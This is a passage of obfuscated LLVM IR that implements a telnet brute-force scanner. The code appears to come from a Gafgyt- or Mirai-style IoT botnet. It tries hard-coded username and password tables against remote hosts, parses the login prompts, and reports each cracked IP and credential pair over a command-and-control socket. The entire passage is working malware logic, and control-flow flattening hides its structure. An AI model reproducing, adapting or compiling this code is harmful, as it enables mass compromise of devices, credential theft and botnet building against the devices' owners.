  %1868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %1867
  %1869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1868, i32 0, i32 8
  %1870 = load i8*, i8** %1869, align 8
  call void @llvm.memset.p0i8.i64(i8* %1870, i8 0, i64 1024, i32 1, i1 false)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1871:                                   ; preds = %loopEntry
  %1872 = load i32, i32* %2, align 4
  %1873 = sext i32 %1872 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %1873
  %1875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1874, i32 0, i32 0
  %1876 = load i32, i32* %1875, align 16
  %1877 = load i32, i32* %2, align 4
  %1878 = sext i32 %1877 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %1878
  %1880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1879, i32 0, i32 8
  %1881 = load i8*, i8** %1880, align 8
  %1882 = load i32, i32* %2, align 4
  %1883 = sext i32 %1882 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %1883
  %1885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1884, i32 0, i32 7
  %1886 = load i16, i16* %1885, align 16
  %1887 = zext i16 %1886 to i32
  %1888 = call i32 @readUntil(i32 %1876, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1881, i32 1024, i32 %1887)
  %1889 = icmp ne i32 %1888, 0
  %1890 = select i1 %1889, i32 836084909, i32 -1493902529
  store i32 %1890, i32* %switchVar
  br label %loopEnd

; <label>:1891:                                   ; preds = %loopEntry
  %1892 = load i32, i32* %2, align 4
  %1893 = sext i32 %1892 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %1893
  %1895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1894, i32 0, i32 6
  store i32 0, i32* %1895, align 4
  %1896 = load i32, i32* %2, align 4
  %1897 = sext i32 %1896 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %1897
  %1899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1898, i32 0, i32 7
  store i16 0, i16* %1899, align 16
  %1900 = load i32, i32* %2, align 4
  %1901 = sext i32 %1900 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %1901
  %1903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1902, i32 0, i32 8
  %1904 = load i8*, i8** %1903, align 8
  %1905 = call i8* @strstr(i8* %1904, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1906 = icmp ne i8* %1905, null
  %1907 = select i1 %1906, i32 -2030868796, i32 -2028064475
  store i32 %1907, i32* %switchVar
  br label %loopEnd

; <label>:1908:                                   ; preds = %loopEntry
  %1909 = load i32, i32* %2, align 4
  %1910 = sext i32 %1909 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %1910
  %1912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1911, i32 0, i32 8
  %1913 = load i8*, i8** %1912, align 8
  call void @llvm.memset.p0i8.i64(i8* %1913, i8 0, i64 1024, i32 1, i1 false)
  %1914 = load i32, i32* %2, align 4
  %1915 = sext i32 %1914 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %1915
  %1917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1916, i32 0, i32 0
  %1918 = load i32, i32* %1917, align 16
  %1919 = call i32 @sclose(i32 %1918)
  %1920 = load i32, i32* %2, align 4
  %1921 = sext i32 %1920 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %1921
  %1923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1922, i32 0, i32 2
  store i8 0, i8* %1923, align 8
  %1924 = load i32, i32* %2, align 4
  %1925 = sext i32 %1924 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %1925
  %1927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1926, i32 0, i32 3
  store i8 0, i8* %1927, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1928:                                   ; preds = %loopEntry
  %1929 = load i32, i32* %2, align 4
  %1930 = sext i32 %1929 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %1930
  %1932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1931, i32 0, i32 2
  store i8 7, i8* %1932, align 8
  store i32 868770536, i32* %switchVar
  br label %loopEnd

; <label>:1933:                                   ; preds = %loopEntry
  %1934 = load i32, i32* %2, align 4
  %1935 = sext i32 %1934 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %1935
  %1937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1936, i32 0, i32 8
  %1938 = load i8*, i8** %1937, align 8
  call void @llvm.memset.p0i8.i64(i8* %1938, i8 0, i64 1024, i32 1, i1 false)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:1939:                                   ; preds = %loopEntry
  %1940 = load i32, i32* %2, align 4
  %1941 = sext i32 %1940 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %1941
  %1943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1942, i32 0, i32 8
  %1944 = load i8*, i8** %1943, align 8
  %1945 = call i64 @strlen(i8* %1944) #10
  %1946 = trunc i64 %1945 to i16
  %1947 = load i32, i32* %2, align 4
  %1948 = sext i32 %1947 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %1948
  %1950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1949, i32 0, i32 7
  store i16 %1946, i16* %1950, align 16
  store i32 784576470, i32* %switchVar
  br label %loopEnd

; <label>:1951:                                   ; preds = %loopEntry
  %1952 = load i32, i32* %2, align 4
  %1953 = sext i32 %1952 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %1953
  %1955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1954, i32 0, i32 6
  %1956 = load i32, i32* %1955, align 4
  %1957 = add i32 %1956, 10
  %1958 = zext i32 %1957 to i64
  %1959 = call i64 @time(i64* null) #2
  %1960 = icmp slt i64 %1958, %1959
  %1961 = select i1 %1960, i32 24816771, i32 132891669
  store i32 %1961, i32* %switchVar
  br label %loopEnd

; <label>:1962:                                   ; preds = %loopEntry
  %1963 = load i32, i32* %2, align 4
  %1964 = sext i32 %1963 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %1964
  %1966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1965, i32 0, i32 0
  %1967 = load i32, i32* %1966, align 16
  %1968 = call i32 @sclose(i32 %1967)
  %1969 = load i32, i32* %2, align 4
  %1970 = sext i32 %1969 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %1970
  %1972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1971, i32 0, i32 2
  store i8 0, i8* %1972, align 8
  %1973 = load i32, i32* %2, align 4
  %1974 = sext i32 %1973 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %1974
  %1976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1975, i32 0, i32 3
  store i8 1, i8* %1976, align 1
  store i32 132891669, i32* %switchVar
  br label %loopEnd

; <label>:1977:                                   ; preds = %loopEntry
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

; <label>:1978:                                   ; preds = %loopEntry
  %1979 = load i32, i32* %2, align 4
  %1980 = sext i32 %1979 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %1980
  %1982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1981, i32 0, i32 0
  %1983 = load i32, i32* %1982, align 16
  %1984 = call i64 @send(i32 %1983, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0), i64 4, i32 16384)
  %1985 = icmp slt i64 %1984, 0
  %1986 = select i1 %1985, i32 -491031496, i32 1464724532
  store i32 %1986, i32* %switchVar
  br label %loopEnd

; <label>:1987:                                   ; preds = %loopEntry
  %1988 = load i32, i32* %2, align 4
  %1989 = sext i32 %1988 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %1989
  %1991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1990, i32 0, i32 0
  %1992 = load i32, i32* %1991, align 16
  %1993 = call i32 @sclose(i32 %1992)
  %1994 = load i32, i32* %2, align 4
  %1995 = sext i32 %1994 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %1996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %1995
  %1997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1996, i32 0, i32 2
  store i8 0, i8* %1997, align 8
  %1998 = load i32, i32* %2, align 4
  %1999 = sext i32 %1998 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %1999
  %2001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2000, i32 0, i32 3
  store i8 1, i8* %2001, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:2002:                                   ; preds = %loopEntry
  %2003 = load i32, i32* %2, align 4
  %2004 = sext i32 %2003 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %2004
  %2006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2005, i32 0, i32 2
  store i8 8, i8* %2006, align 8
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

; <label>:2007:                                   ; preds = %loopEntry
  %2008 = load i32, i32* %2, align 4
  %2009 = sext i32 %2008 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %2009
  %2011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2010, i32 0, i32 0
  %2012 = load i32, i32* %2011, align 16
  %2013 = call i64 @send(i32 %2012, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i32 0, i32 0), i64 9, i32 16384)
  %2014 = icmp slt i64 %2013, 0
  %2015 = select i1 %2014, i32 -1968798411, i32 1336106018
  store i32 %2015, i32* %switchVar
  br label %loopEnd

; <label>:2016:                                   ; preds = %loopEntry
  %2017 = load i32, i32* %2, align 4
  %2018 = sext i32 %2017 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %2018
  %2020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2019, i32 0, i32 0
  %2021 = load i32, i32* %2020, align 16
  %2022 = call i32 @sclose(i32 %2021)
  %2023 = load i32, i32* %2, align 4
  %2024 = sext i32 %2023 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %2024
  %2026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2025, i32 0, i32 2
  store i8 0, i8* %2026, align 8
  %2027 = load i32, i32* %2, align 4
  %2028 = sext i32 %2027 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %2028
  %2030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2029, i32 0, i32 3
  store i8 1, i8* %2030, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:2031:                                   ; preds = %loopEntry
  %2032 = load i32, i32* %2, align 4
  %2033 = sext i32 %2032 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %2033
  %2035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2034, i32 0, i32 2
  store i8 9, i8* %2035, align 8
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

; <label>:2036:                                   ; preds = %loopEntry
  %2037 = load i32, i32* %2, align 4
  %2038 = sext i32 %2037 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %2038
  %2040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2039, i32 0, i32 0
  %2041 = load i32, i32* %2040, align 16
  %2042 = call i64 @send(i32 %2041, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2043 = icmp slt i64 %2042, 0
  %2044 = select i1 %2043, i32 1331693113, i32 -2142244300
  store i32 %2044, i32* %switchVar
  br label %loopEnd

; <label>:2045:                                   ; preds = %loopEntry
  %2046 = load i32, i32* %2, align 4
  %2047 = sext i32 %2046 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %2047
  %2049 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2048, i32 0, i32 0
  %2050 = load i32, i32* %2049, align 16
  %2051 = call i32 @sclose(i32 %2050)
  %2052 = load i32, i32* %2, align 4
  %2053 = sext i32 %2052 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %2053
  %2055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2054, i32 0, i32 2
  store i8 0, i8* %2055, align 8
  %2056 = load i32, i32* %2, align 4
  %2057 = sext i32 %2056 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %2057
  %2059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2058, i32 0, i32 3
  store i8 1, i8* %2059, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:2060:                                   ; preds = %loopEntry
  %2061 = load i32, i32* @mainCommSock, align 4
  %2062 = load i32, i32* %2, align 4
  %2063 = sext i32 %2062 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %2063
  %2065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2064, i32 0, i32 1
  %2066 = bitcast i32* %2065 to %struct.in_addr*
  %2067 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2066, i32 0, i32 0
  %2068 = load i32, i32* %2067, align 4
  %2069 = call i8* @inet_ntoa(i32 %2068) #2
  %2070 = load i32, i32* %2, align 4
  %2071 = sext i32 %2070 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %2071
  %2073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2072, i32 0, i32 4
  %2074 = load i8, i8* %2073, align 2
  %2075 = zext i8 %2074 to i64
  %2076 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2075
  %2077 = load i8*, i8** %2076, align 8
  %2078 = load i32, i32* %2, align 4
  %2079 = sext i32 %2078 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %2079
  %2081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2080, i32 0, i32 5
  %2082 = load i8, i8* %2081, align 1
  %2083 = zext i8 %2082 to i64
  %2084 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2083
  %2085 = load i8*, i8** %2084, align 8
  %2086 = call i32 (i32, i8*, ...) @sockprintf(i32 %2061, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2069, i8* %2077, i8* %2085)
  %2087 = load i32, i32* %2, align 4
  %2088 = sext i32 %2087 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %2088
  %2090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2089, i32 0, i32 2
  store i8 10, i8* %2090, align 8
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

; <label>:2091:                                   ; preds = %loopEntry
  %2092 = load i32, i32* %2, align 4
  %2093 = sext i32 %2092 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %2093
  %2095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2094, i32 0, i32 6
  %2096 = load i32, i32* %2095, align 4
  %2097 = icmp eq i32 %2096, 0
  %2098 = select i1 %2097, i32 -85635614, i32 -867023163
  store i32 %2098, i32* %switchVar
  br label %loopEnd

; <label>:2099:                                   ; preds = %loopEntry
  %2100 = call i64 @time(i64* null) #2
  %2101 = trunc i64 %2100 to i32
  %2102 = load i32, i32* %2, align 4
  %2103 = sext i32 %2102 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %2103
  %2105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2104, i32 0, i32 6
  store i32 %2101, i32* %2105, align 4
  store i32 -867023163, i32* %switchVar
  br label %loopEnd

; <label>:2106:                                   ; preds = %loopEntry
  %2107 = load i32, i32* %2, align 4
  %2108 = sext i32 %2107 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %2108
  %2110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2109, i32 0, i32 0
  %2111 = load i32, i32* %2110, align 16
  %2112 = load i32, i32* %2, align 4
  %2113 = sext i32 %2112 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %2113
  %2115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2114, i32 0, i32 8
  %2116 = load i8*, i8** %2115, align 8
  %2117 = load i32, i32* %2, align 4
  %2118 = sext i32 %2117 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %2118
  %2120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2119, i32 0, i32 7
  %2121 = load i16, i16* %2120, align 16
  %2122 = zext i16 %2121 to i32
  %2123 = call i32 @readUntil(i32 %2111, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2116, i32 1024, i32 %2122)
  %2124 = icmp ne i32 %2123, 0
  %2125 = select i1 %2124, i32 -1281217760, i32 -362091026
  store i32 %2125, i32* %switchVar
  br label %loopEnd

; <label>:2126:                                   ; preds = %loopEntry
  %2127 = load i32, i32* %2, align 4
  %2128 = sext i32 %2127 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %2128
  %2130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2129, i32 0, i32 6
  store i32 0, i32* %2130, align 4
  %2131 = load i32, i32* %2, align 4
  %2132 = sext i32 %2131 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %2132
  %2134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2133, i32 0, i32 7
  store i16 0, i16* %2134, align 16
  %2135 = load i32, i32* %2, align 4
  %2136 = sext i32 %2135 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %2136
  %2138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2137, i32 0, i32 0
  %2139 = load i32, i32* %2138, align 16
  %2140 = call i64 @send(i32 %2139, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2141 = load i32, i32* @mainCommSock, align 4
  %2142 = load i32, i32* %2, align 4
  %2143 = sext i32 %2142 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %2143
  %2145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2144, i32 0, i32 1
  %2146 = bitcast i32* %2145 to %struct.in_addr*
  %2147 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2146, i32 0, i32 0
  %2148 = load i32, i32* %2147, align 4
  %2149 = call i8* @inet_ntoa(i32 %2148) #2
  %2150 = load i32, i32* %2, align 4
  %2151 = sext i32 %2150 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %2151
  %2153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2152, i32 0, i32 4
  %2154 = load i8, i8* %2153, align 2
  %2155 = zext i8 %2154 to i64
  %2156 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2155
  %2157 = load i8*, i8** %2156, align 8
  %2158 = load i32, i32* %2, align 4
  %2159 = sext i32 %2158 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %2159
  %2161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2160, i32 0, i32 5
  %2162 = load i8, i8* %2161, align 1
  %2163 = zext i8 %2162 to i64
  %2164 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2163
  %2165 = load i8*, i8** %2164, align 8
  %2166 = call i32 (i32, i8*, ...) @sockprintf(i32 %2141, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2149, i8* %2157, i8* %2165)
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:2167:                                   ; preds = %loopEntry
  %2168 = load i32, i32* %2, align 4
  %2169 = sext i32 %2168 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %2169
  %2171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2170, i32 0, i32 0
  %2172 = load i32, i32* %2171, align 16
  %2173 = load i32, i32* %2, align 4
  %2174 = sext i32 %2173 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %2174
  %2176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2175, i32 0, i32 8
  %2177 = load i8*, i8** %2176, align 8
  %2178 = load i32, i32* %2, align 4
  %2179 = sext i32 %2178 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %2179
  %2181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2180, i32 0, i32 7
  %2182 = load i16, i16* %2181, align 16
  %2183 = zext i16 %2182 to i32
  %2184 = call i32 @readUntil(i32 %2172, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2177, i32 1024, i32 %2183)
  %2185 = icmp ne i32 %2184, 0
  %2186 = select i1 %2185, i32 56329637, i32 -919019281
  store i32 %2186, i32* %switchVar
  br label %loopEnd

; <label>:2187:                                   ; preds = %loopEntry
  %2188 = load i32, i32* %2, align 4
  %2189 = sext i32 %2188 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %2189
  %2191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2190, i32 0, i32 6
  store i32 0, i32* %2191, align 4
  %2192 = load i32, i32* %2, align 4
  %2193 = sext i32 %2192 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %2193
  %2195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2194, i32 0, i32 7
  store i16 0, i16* %2195, align 16
  %2196 = load i32, i32* %2, align 4
  %2197 = sext i32 %2196 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %2197
  %2199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2198, i32 0, i32 0
  %2200 = load i32, i32* %2199, align 16
  %2201 = call i64 @send(i32 %2200, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2202 = load i32, i32* @mainCommSock, align 4
  %2203 = load i32, i32* %2, align 4
  %2204 = sext i32 %2203 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %2204
  %2206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2205, i32 0, i32 1
  %2207 = bitcast i32* %2206 to %struct.in_addr*
  %2208 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2207, i32 0, i32 0
  %2209 = load i32, i32* %2208, align 4
  %2210 = call i8* @inet_ntoa(i32 %2209) #2
  %2211 = load i32, i32* %2, align 4
  %2212 = sext i32 %2211 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %2213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %2212
  %2214 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2213, i32 0, i32 4
  %2215 = load i8, i8* %2214, align 2
  %2216 = zext i8 %2215 to i64
  %2217 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2216
  %2218 = load i8*, i8** %2217, align 8
  %2219 = load i32, i32* %2, align 4
